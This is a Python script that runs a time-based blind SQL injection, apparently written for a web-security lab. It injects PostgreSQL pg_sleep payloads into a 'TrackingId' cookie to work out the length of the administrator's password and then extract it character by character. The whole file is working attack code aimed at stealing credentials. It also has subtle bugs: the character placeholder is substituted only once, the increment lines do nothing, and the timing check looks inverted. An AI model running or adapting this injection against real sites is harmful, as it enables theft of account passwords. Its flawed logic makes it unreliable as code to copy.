import requests
import sys
from http import cookies
import urllib3
import urllib

def getCookie(sql_command):
	response = requests.get(url)
	for cookie in response.cookies:
		if cookie.name == cookie_name:
			new_cookie_value = response.cookies[cookie_name] + sql_command.replace(" ", "+")
			new_cookie_value = new_cookie_value.replace(";", "%3B")
			response.cookies.set(cookie_name, None)
			response.cookies.set(cookie_name, new_cookie_value)
			return response.cookies

def sendSql(sql_command):
	cookie = getCookie(sql_command)
	response = requests.get(url, verify=False, proxies=proxy, cookies=cookie)
	if response.elapsed.total_seconds() < 1:
		return True
	else:
		return False

def getLenght(sql_command):
	for i in range (0,100):
		sql_command_i= sql_command %(i)
		if sendSql(sql_command_i):
			return i
			break
		else:
			++i

def getPasswordChar(sql_command):
	#ASCII printable set from a to z and from 0 to 9
	for j in list(range(48,58)) + list(range(97,123)):
		sql_command = sql_command.replace("[CHAR]", chr(j))
		if sendSql(sql_command):
			++j
		else:
			return chr(j)

def main():

	urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

	global proxy,url,cookie_name

	url = sys.argv[1]
	proxy = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}
	cookie_name = "TrackingId"
	sql_lenght = "';SELECT CASE WHEN (username='administrator' AND LENGTH(password)>%s) THEN pg_sleep(1) ELSE pg_sleep(0) END FROM users--"
	sql_password = "';SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,%s,1)='[CHAR]') THEN pg_sleep(1) ELSE pg_sleep(0) END FROM users--"

	print ("(+) Looking for the password lenght. Wait...")
	password_lenght = getLenght(sql_lenght)
	print ("(+) Password lenght is %s" %(password_lenght))

	print ("(+) Looking for the password. Wait...")
	for i in range(1, int(password_lenght)+1):
		password_char_i = sql_password %i
		password_char = getPasswordChar(password_char_i)
		sys.stdout.write(password_char)
		sys.stdout.flush()
		++i
	print ("\n(+) done!")


if __name__ == '__main__':
    main()
